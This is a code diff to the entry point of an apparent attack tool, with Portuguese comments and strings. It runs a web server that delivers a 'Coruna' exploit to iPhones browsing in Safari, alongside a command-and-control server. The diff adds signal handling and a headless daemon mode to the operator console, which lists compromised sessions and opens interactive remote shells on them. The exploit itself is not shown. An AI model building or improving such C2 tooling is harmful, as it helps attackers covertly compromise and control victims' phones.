@@ -5,6 +5,7 @@ Entry point - Web server (Coruna exploit) + C2 server.
 
 import asyncio
 import os
+import signal
 import sys
 
 _script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -35,10 +36,23 @@ async def main():
     print("\n[*] Coruna rodando. Acesse http://IP_DA_VPS/ no iPhone (Safari)")
     print("[*] Comandos: list | use <id> | help | quit\n")
 
+    shutdown_event = asyncio.Event()
+
+    def _signal_handler():
+        print("\n[*] Sinal de término recebido. Encerrando...")
+        shutdown_event.set()
+
+    loop = asyncio.get_running_loop()
+    for sig in (signal.SIGINT, signal.SIGTERM):
+        try:
+            loop.add_signal_handler(sig, _signal_handler)
+        except (NotImplementedError, RuntimeError):
+            pass
+
     async def run_shell(session):
         """Modo interativo de shell para uma sessão."""
         print(f"\n[*] Conectado a {session.ip_address} (sessão {session.id}). Digite 'exit' ou 'back' para voltar.\n")
-        while True:
+        while not shutdown_event.is_set():
             try:
                 cmd = await loop.run_in_executor(None, lambda: input("(shell)> ").strip())
             except (EOFError, KeyboardInterrupt):
@@ -63,32 +77,40 @@ async def main():
                 print(f"[-] Erro: {e}")
                 break
 
-    loop = asyncio.get_running_loop()
-    while True:
+    is_headless = os.environ.get("CORUNA_HEADLESS") in ("1", "true", "yes") or not sys.stdin.isatty()
+    if is_headless:
+        print("[*] Modo daemon/não-interativo ativo. Web server e C2 aguardando conexões...")
+        print("[*] Pressione Ctrl+C ou envie SIGTERM para parar.\n")
         try:
-            cmd = await loop.run_in_executor(None, lambda: input("(coruna)> ").strip().lower())
-        except (EOFError, KeyboardInterrupt):
-            break
-        if cmd in ("quit", "exit"):
-            break
-        if cmd in ("help", "h", "?"):
-            print("  list       lista sessões ativas (IDs)")
-            print("  use <id>   entra na shell da sessão (ex: use abc12345)")
-            print("  quit       encerra o servidor")
-            continue
-        if cmd in ("list", "ls", "sessions"):
-            for s in c2_server.get_sessions_summary():
-                print(f"  [{s['id']}] {s['ip_address']} {s['connected_at']}")
-            if not c2_server.get_sessions_summary():
-                print("  (nenhuma sessão)")
-        elif cmd.startswith("use "):
-            parts = cmd.split(maxsplit=1)
-            sid = parts[1] if len(parts) > 1 else ""
-            session = c2_server.get_session_by_id(sid)
-            if session:
-                await run_shell(session)
-            else:
-                print(f"[-] Sessão '{sid}' não encontrada. Use 'list' para ver IDs.")
+            await shutdown_event.wait()
+        except (asyncio.CancelledError, KeyboardInterrupt):
+            pass
+    else:
+        while not shutdown_event.is_set():
+            try:
+                cmd = await loop.run_in_executor(None, lambda: input("(coruna)> ").strip().lower())
+            except (EOFError, KeyboardInterrupt):
+                break
+            if cmd in ("quit", "exit"):
+                break
+            if cmd in ("help", "h", "?"):
+                print("  list       lista sessões ativas (IDs)")
+                print("  use <id>   entra na shell da sessão (ex: use abc12345)")
+                print("  quit       encerra o servidor")
+                continue
+            if cmd in ("list", "ls", "sessions"):
+                for s in c2_server.get_sessions_summary():
+                    print(f"  [{s['id']}] {s['ip_address']} {s['connected_at']}")
+                if not c2_server.get_sessions_summary():
+                    print("  (nenhuma sessão)")
+            elif cmd.startswith("use "):
+                parts = cmd.split(maxsplit=1)
+                sid = parts[1] if len(parts) > 1 else ""
+                session = c2_server.get_session_by_id(sid)
+                if session:
+                    await run_shell(session)
+                else:
+                    print(f"[-] Sessão '{sid}' não encontrada. Use 'list' para ver IDs.")
 
     c2_task.cancel()
     try:
@@ -97,7 +119,11 @@ async def main():
         pass
     c2_server.stop()
     await web_server.stop()
+    print("[*] Servidores finalizados com sucesso.")
 
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        pass
